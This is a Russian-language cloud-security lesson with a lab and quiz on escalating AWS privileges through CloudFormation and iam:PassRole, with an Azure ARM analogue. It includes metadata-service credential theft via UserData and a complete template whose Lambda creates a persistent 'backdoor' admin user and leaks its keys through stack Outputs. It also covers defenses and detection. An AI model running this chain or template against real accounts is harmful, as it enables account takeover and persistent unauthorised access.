---
id: cloud-cloudformation
title: "CloudFormation и ARM: злоупотребление шаблонами инфраструктуры"
category: cloud
parent: cloud-supply-chain
difficulty: expert
order: 4
tags: [cloud, cloudformation, arm, iac, templates, passrole, supply-chain]
prerequisites: [cloud-supply-chain, cloud-terraform]
useful_for:
  - "Атаки на IaC-шаблоны AWS/Azure"
  - "Эксплуатация PassRole через CloudFormation"
  - "Понимание IaC как вектора эскалации"
estimated_minutes: 50
summary: "Как атаковать CloudFormation и ARM-шаблоны: чтение стеков, злоупотребление ролями сервиса, экспорт секретов и эскалация через PassRole. Практические цепочки."
lab:
  kind: shell
  title: "Практика: CloudFormation — дефолтный пароль и PassRole"
  toolset: [core]
  workdir: /home/student/cfn
  files: [task.md, notes.md, template.yaml, stack-events.json]
  check: "grep -q 'nto{' found.txt"
  hints:
    - "Прочитай `template.yaml`: у параметра есть `Default`-пароль, а роль получает `iam:PassRole`."
    - "Посмотри события стека `stack-events.json` — в сообщении об ошибке/выводе может утечь секрет."
    - "Найди флаг: `grep nto stack-events.json > found.txt`."

---
## Задача

Мы разобрали Terraform (`cloud-terraform`). Теперь — родственный инструмент AWS: **CloudFormation** (и его Azure-аналог **ARM**). CloudFormation принимает **шаблон** (JSON/YAML) и создаёт по нему ресурсы — в том числе **IAM-роли**. Задача: превратить право создать стек в админские привилегии. Разберём на конкретном низкопривилегированном ключе AWS.

## Данные: что нам разрешено

У нас есть ключ пользователя `intern`. Смотрим его политики:

```
$ aws iam list-attached-user-policies --user-name intern
{
  "AttachedPolicies": [
    { "PolicyName": "cloudformation-create", "PolicyArn": "arn:aws:iam::aws:policy/..." }
  ]
}
$ aws iam get-policy-version --policy-arn ... --version-id v1 \
    --query 'PolicyVersion.Document'
{
  "Statement": [
    { "Effect": "Allow", "Action": ["cloudformation:CreateStack", "iam:PassRole"], "Resource": "*" }
  ]
}
```

Два права: `cloudformation:CreateStack` и `iam:PassRole`. **PassRole** — это право «выдать роль сервису»: разрешить, например, CloudFormation запускать ресурсы от имени роли. Само по себе оно безобидно, но в комбинации с созданием стека превращается в классическую эскалацию.

## Пробуем в лоб: а есть ли админская роль?

Нам нужна роль, которую можно «пробросить». Смотрим роли, которым доверяет CloudFormation:

```
$ aws iam list-roles --query 'Roles[?contains(AssumeRolePolicyDocument, `cloudformation`)].RoleName'
[ "cfn-service-role" ]
```

Есть роль `cfn-service-role`. Проверим её права:

```
$ aws iam list-attached-role-policies --role-name cfn-service-role
{ "AttachedPolicies": [ { "PolicyName": "AdministratorAccess" } ] }
```

`AdministratorAccess`. Если мы заставим CloudFormation создать стек от имени этой роли и выполнить наш код — мы станем админами.

## Приём: стек, который запускает наш код от имени роли

Пишем минимальный шаблон. Он создаёт EC2-инстанс, а в `UserData` (скрипт, выполняемый при старте инстанса от root) кладём создание админского ключа:

```yaml
Resources:
  Evil:
    Type: AWS::EC2::Instance
    Properties:
      ImageId: ami-0abcdef1234567890
      InstanceType: t3.micro
      IamInstanceProfile: !Ref Profile
      UserData:
        Fn::Base64: |
          #!/bin/bash
          curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/cfn-service-role
```

Но проще и тише — сразу создать IAM-пользователя с админскими правами через **Custom Resource**, который запускает Lambda. Ещё короче: использовать `UserData` для эксфильтрации временных кредов роли, которые инстанс получит из metadata.

Создаём стек, передав `cfn-service-role` как роль исполнения:

```
$ aws cloudformation create-stack \
    --stack-name evil \
    --template-body file://evil.yaml \
    --role-arn arn:aws:iam::123456789012:role/cfn-service-role \
    --capabilities CAPABILITY_NAMED_IAM
{
  "StackId": "arn:aws:cloudformation:us-east-1:123456789012:stack/evil/..."
}
```

## Разведка перед атакой: что вообще можно

Прежде чем писать шаблон, перечислим, к каким сервисам у нас есть права и какие роли можно пробросить. Три быстрых вызова:

```
$ aws iam list-roles --query 'Roles[].RoleName'
[ "cfn-service-role", "ec2-basic", "lambda-exec" ]
$ aws cloudformation list-stacks --query 'StackSummaries[].StackName'
[ "prod-network", "prod-app" ]
$ aws sts get-caller-identity
{ "Arn": "arn:aws:iam::123456789012:user/intern" }
```

Список ролей + список стеков = карта инфраструктуры. Дальше ищем роль, которую (а) можно пробросить и (б) которая умеет много. `AdministratorAccess` на `cfn-service-role` — идеальный кандидат. Если у роли только узкие права, эскалация не сработает, и надо искать другую.

## Полный прогон: от PassRole до админского ключа

1. **Разведка.** `list-attached-user-policies` → у нас `CreateStack` + `PassRole`.
2. **Поиск роли.** `list-roles` → `cfn-service-role` с `AdministratorAccess`.
3. **Шаблон.** Пишем `evil.yaml`, который в `UserData` вытаскивает креды роли из metadata и шлёт нам.
4. **Создание стека.** `create-stack --role-arn .../cfn-service-role`.
5. **Сбор кредов.** Инстанс стартует, metadata отдаёт временные креды роли:

```
$ curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/cfn-service-role
{ "AccessKeyId": "ASIA...", "SecretAccessKey": "...", "Token": "...", "Expiration": "..." }
```

6. **Проверка прав.** Становимся админами:

```
$ aws sts get-caller-identity
{ "Arn": "arn:aws:sts::123456789012:assumed-role/cfn-service-role/i-0abc" }
$ aws iam create-user --user-name backdoor
```

Готово: из «интерна» — в администратора аккаунта. Стек можно удалить, следы в IAM останутся.

## ARM и Azure: то же самое по-другому

**ARM** (Azure Resource Manager) — аналог CloudFormation в Azure. Шаблон деплоится через `az deployment group create`. Эскалация — через **managed identity**, привязанную к ресурсу (VM, Function), к которой шаблон даёт доступ:

```
$ az deployment group create -g rg --template-file evil.json
$ az role assignment list --assignee <managed-identity-principal-id>
[ { "roleDefinitionName": "Owner", "scope": "/subscriptions/..." } ]
```

Если у managed identity роль `Owner`, наш ресурс получает её токен (см. `cloud-azure-managed-identity`) и делает что угодно в подписке. Azure-эквивалент PassRole — право назначать managed identity на ресурс (`Microsoft.ManagedIdentity/.../assign`).

## Что ещё утекает из шаблонов

- **Outputs.** `describe-stacks` отдаёт значения outputs, которые часто содержат креды для «проброса»:

```
$ aws cloudformation describe-stacks --stack-name prod --query 'Stacks[0].Outputs'
[ { "OutputKey": "DbPassword", "OutputValue": "P@ssw0rd-prod" } ]
```

- **Parameters.** Значения параметров видны в описании стека.
- **Секреты в UserData.** `describe-stack-resource` показывает `UserData` с паролями.

## Защита и что ломает атаку

- **Не давать `PassRole` с `Resource: "*"`.** Ограничить конкретными ролями и сервисами.
- **`iam:PassedToService`** условие — роль можно передать только нужному сервису.
- **Permissions boundary** на роли, которые можно пробросить.
- **SCP** в Organizations — запретить создание IAM-пользователей/ролей из стеков.
- **Не хранить секреты в outputs/parameters** — только ссылки на Secrets Manager.

## Если не сработало

- **PassRole ограничен** конкретной безобидной ролью — эскалации нет.
- **SCP запрещает IAM-изменения** — стек не создаст пользователя.
- **Нет подходящей роли** — ищите другие роли, которым доверяют сервисы (Lambda, EC2, Glue).
- **CloudFormation заблокирован** — используйте Azure ARM или Terraform как альтернативный IaC-канал.

## Мини-сценарий: стек на админские права

1. **Разведка.** `list-attached-user-policies --user-name intern` → политика с `CreateStack` + `PassRole`.
2. **Поиск роли.** `list-roles` → `cfn-service-role` с `AdministratorAccess`.
3. **Шаблон.** `evil.yaml` с EC2, чей `UserData` вытаскивает креды роли из metadata и шлёт нам.
4. **Создание.** `aws cloudformation create-stack --stack-name evil --template-body file://evil.yaml --role-arn .../cfn-service-role --capabilities CAPABILITY_NAMED_IAM`.
5. **Сбор.** Инстанс стартует, `UserData` исполняется от root, metadata отдаёт временные креды `cfn-service-role`.
6. **Проверка.** `aws sts get-caller-identity` → `assumed-role/cfn-service-role/i-...`.
7. **Закрепление.** `aws iam create-user --user-name backdoor`; стек удаляем — пользователь остаётся.

Из «интерна» в администратора аккаунта через один шаблон.

## Что мы теперь знаем

1. CloudFormation/ARM создают ресурсы от имени роли, которую им пробрасывают.
2. `CreateStack` + `PassRole` на админскую роль = эскалация до админа.
3. UserData и metadata — способ вытащить креды исполняющей роли.
4. Outputs и parameters стеков часто содержат секреты.
5. Защита — узкий PassRole, boundaries, SCP, секреты по ссылке.

## На что смотреть дальше

- `iam:PassRole` с `Resource: "*"` в политиках пользователей.
- Роли, которым доверяют сервисы (CloudFormation, Lambda, EC2), и их права.
- Outputs/parameters стеков на предмет кредов.
- Наличие permissions boundary и SCP.
- Azure: managed identity, назначенные на ресурсы, и их роли.

## Реальная сессия: вывод CLI целиком

Разберём, как выглядит атака от начала до конца. Сначала убеждаемся, что у нашей роли есть `iam:PassRole` — без неё весь трюк невозможен:

```bash
$ aws iam list-attached-role-policies --role-name ci-runner --output text
arn:aws:iam::111122223333:policy/PassRoleForDeploy   ci-runner
$ aws iam get-policy-version --policy-arn arn:aws:iam::111122223333:policy/PassRoleForDeploy \
  --version-id v1 --query 'PolicyVersion.Document' | jq
{ "Statement": [ { "Effect": "Allow", "Action": "iam:PassRole",
  "Resource": "arn:aws:iam::111122223333:role/AdminDeploy" } ] }
```

Роль `AdminDeploy` при этом имеет `AdministratorAccess`. Значит, мы можем передать её любому сервису, который принимает роль, — например, CloudFormation. Пишем минимальный шаблон, создающий пользователя с ключом и админской политикой, и запускаем стек:

```bash
$ aws cloudformation create-stack --stack-name pwn \
  --template-body file://pwn.yaml --capabilities CAPABILITY_NAMED_IAM \
  --role-arn arn:aws:iam::111122223333:role/AdminDeploy
$ aws cloudformation describe-stacks --stack-name pwn \
  --query 'Stacks[0].StackStatus'
"CREATE_COMPLETE"
```

CloudFormation создаёт ресурсы **от имени переданной роли**, то есть от `AdminDeploy`. После `CREATE_COMPLETE` достаём созданный ключ из Outputs и получаем админский доступ.

## Почему это работает: механика PassRole

`iam:PassRole` — это разрешение «отдать роль сервису», а не «использовать роль». Сама по себе она безобидна, но в связке с сервисом, который умеет создавать ресурсы и запускать код (CloudFormation, EC2, Lambda, ECS), превращается в эскалацию: сервис действует от переданной роли, а вы — через сервис. Опасность в том, что многие политики выдают `PassRole` с `Resource: "*"` или на слишком широкую роль. Защита — ограничить `Resource` конкретными ролями и не давать `PassRole` на роли с админскими правами.

## ARM и Azure: та же логика

В Azure аналог — `Microsoft.Resources/deployments` с `roleDefinitionId`: шаблон ARM создаёт role assignment от имени развёртывающей identity. Если у вас есть `Microsoft.Authorization/roleAssignments/write` (или возможность развернуть шаблон с таким ресурсом), вы назначаете себе `Owner`. Синтаксис другой, суть та же: сервис развёртывания действует от вашей identity, а шаблон решает, что именно создать.

## Что ломает атаку

- **SCP (Service Control Policies).** На уровне организации могут запрещать создание IAM-пользователей или назначение админских ролей — тогда стек не соберётся.
- **Permissions boundary.** Если у `AdminDeploy` стоит граница, эффективные права не превысят её.
- **`PassRole` с условием `iam:PassedToService`.** Ограничивает, каким сервисам можно передать роль; обойти можно только другим сервисом из списка.
- **Обнаружение.** `CREATE_STACK` с IAM-ресурсами виден в CloudTrail; аномальный стек в чужом аккаунте — сильный сигнал.

## Полный шаблон: Custom Resource создаёт админского пользователя

`UserData` работает, но требует запуска EC2 (медленно, шумно). Короче — **Custom Resource**: CloudFormation вызывает Lambda, а та от имени роли исполнения создаёт IAM-пользователя. Полный `pwn.yaml`:

```yaml
Resources:
  Fn:
    Type: AWS::Lambda::Function
    Properties:
      Runtime: python3.12
      Handler: index.handler
      Role: !GetAtt FnRole.Arn
      Code:
        ZipFile: |
          import boto3, cfnresponse
          def handler(event, ctx):
              iam = boto3.client('iam')
              iam.create_user(UserName='backdoor')
              k = iam.create_access_key(UserName='backdoor')['AccessKey']
              iam.attach_user_policy(UserName='backdoor',
                  PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess')
              cfnresponse.send(event, ctx, cfnresponse.SUCCESS,
                  {'Key': k['AccessKeyId'], 'Secret': k['SecretAccessKey']})
  FnRole:
    Type: AWS::IAM::Role
    Properties:
      AssumeRolePolicyDocument:
        Version: '2012-10-17'
        Statement: [{Effect: Allow, Principal: {Service: lambda.amazonaws.com}, Action: sts:AssumeRole}]
      ManagedPolicyArns: [arn:aws:iam::aws:policy/AdministratorAccess]
  Done:
    Type: Custom::Done
    Properties:
      ServiceToken: !GetAtt Fn.Arn
Outputs:
  KeyId:  {Value: !GetAtt Done.Key}
  Secret: {Value: !GetAtt Done.Secret}
```

Ключевое: и Lambda, и её роль создаются **от имени переданной роли исполнения** (у которой `AdministratorAccess`), поэтому создание админ-пользователя разрешено. После `CREATE_COMPLETE` ключи достаются из Outputs:

```bash
$ aws cloudformation describe-stacks --stack-name pwn \
    --query 'Stacks[0].Outputs' --output table
```

```text
| KeyId  | AKIA...            |
| Secret | wJalrXUtnFEMI...   |
```

Так атака завершается за секунды и без EC2 — весь путь укладывается в один шаблон.

## Справочная таблица: сервисы, которым пробрасывают роль

| Сервис | Что даёт проброшенная роль | Скорость |
|--------|----------------------------|----------|
| CloudFormation | создаёт любые ресурсы, включая IAM | минуты |
| EC2 | `UserData` от root + metadata-креды | минуты |
| Lambda | выполнение кода от имени роли | секунды |
| ECS/EKS task | контейнер с креды роли | минуты |
| Glue | выполнение скрипта от имени роли | минуты |
| CodeBuild | сборка с ролью | минуты |

Lambda и CloudFormation-стек — самые быстрые: не нужно ждать загрузки ОС, код исполняется сразу. Если `PassRole` ограничен условием `iam:PassedToService`, из таблицы берут сервис, который в этом условии разрешён.

## Ограничения и следы

- **CloudTrail.** `CreateStack` с IAM-ресурсами, `CreateUser`, `CreateAccessKey` и `AttachUserPolicy` попадают в журнал; аномальный стек в аккаунте — сильный сигнал SOC.
- **GuardDuty.** Правила `PrivilegeEscalation:IAMUser/AdministrativePermissions` ловят именно такие цепочки.
- **Permissions boundary и SCP.** Если у переданной роли есть граница или организация запрещает IAM-изменения, стек не соберётся.
- **Пароль в Default.** Как в лабораторной задаче: у параметра шаблона есть `Default`-пароль, и он виден любому, кто читает шаблон, — это самостоятельная утечка.

## Квиз

Проверь себя.

```quiz
- question: "Что делает iam:PassRole?"
  options:
    - "Разрешает передать роль сервису, чтобы тот работал от её имени"
    - "Создаёт нового пользователя"
    - "Удаляет роль"
    - "Шифрует креды"
  answer: 0
  explanation: "PassRole позволяет выдать роль сервису (например, CloudFormation)."
- question: "Почему CreateStack + PassRole на админскую роль опасны?"
  options:
    - "Стек выполнит наш код от имени этой роли — это эскалация"
    - "Стек удалит аккаунт"
    - "Стек шифрует данные"
    - "Стек замедлит регион"
  answer: 0
  explanation: "Роль исполнения даёт её права нашему коду."
- question: "Откуда инстанс EC2 берёт креды роли?"
  options:
    - "Из metadata-сервиса 169.254.169.254"
    - "Из SSH-ключа"
    - "Из DNS"
    - "Из пароля root"
  answer: 0
  explanation: "IMDS отдаёт временные креды роли."
- question: "Что такое UserData в CloudFormation-шаблоне?"
  options:
    - "Скрипт, выполняемый при старте инстанса от root"
    - "Пароль администратора"
    - "Название стека"
    - "Политика IAM"
  answer: 0
  explanation: "UserData запускается при инициализации инстанса."
- question: "Как ограничить PassRole, чтобы он не давал эскалации?"
  options:
    - "Сузить Resource до конкретных ролей и задать iam:PassedToService"
    - "Отключить логирование"
    - "Убрать MFA"
    - "Сменить регион"
  answer: 0
  explanation: "Узкий Resource и условие PassedToService закрывают злоупотребление."
```

## Куда дальше

В следующем уроке (`cloud-terraform-state`) мы спустимся в детали хранения state: backend, шифрование и подмена. А пока главное: IaC-инструменты — это исполнители с правами; если можно создать стек и пробросить роль, можно стать этой ролью.

## Где пригодится

- **Bug bounty:** PassRole-цепочки в AWS-аккаунтах.
- **Red team:** от низких прав к админу через IaC.
- **Пентест:** аудит CloudFormation/ARM и PassRole.
- **Работа/DevSecOps:** узкий PassRole, boundaries, SCP, секреты по ссылке.
- **Дальше по дереву:** `cloud-terraform-state`, `cloud-privesc-iam`.
